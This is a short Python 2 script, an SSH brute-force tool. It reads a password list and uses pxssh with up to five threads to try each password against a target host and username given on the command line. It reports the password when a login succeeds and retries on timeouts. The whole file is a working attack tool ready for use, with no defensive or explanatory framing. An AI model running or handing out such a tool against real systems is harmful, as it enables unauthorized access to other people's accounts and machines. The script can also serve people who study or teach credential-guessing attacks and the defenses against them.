from pexpect import pxssh
import time
import threading as th
import optparse

# some quick global variables
max_connections = 5
connection_lock = th.BoundedSemaphore(value=max_connections)
Found = False
Fails = 0


PROMPT = ['#', '>>>', '>', '\$']

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print child.before

def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print '[+] password found: ' + str(password)  
        Found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release: connection_lock.release()


def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)

    fn = open(passwdFile, 'r') 
    for line in fn.readlines():
        # exit if password is found
        if Found:
            print '[*] Exiting password found'
            exit(0)
        # exit if all of our connections hang
        if Fails > 5:
            print '[!] exiting: too many socket timeouts'
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print '[-] testing: ' + str(password)
        t = th.Thread(target=connect, args=(host, user, password, True))
        child = t.start()

if __name__ == "__main__":
    main()
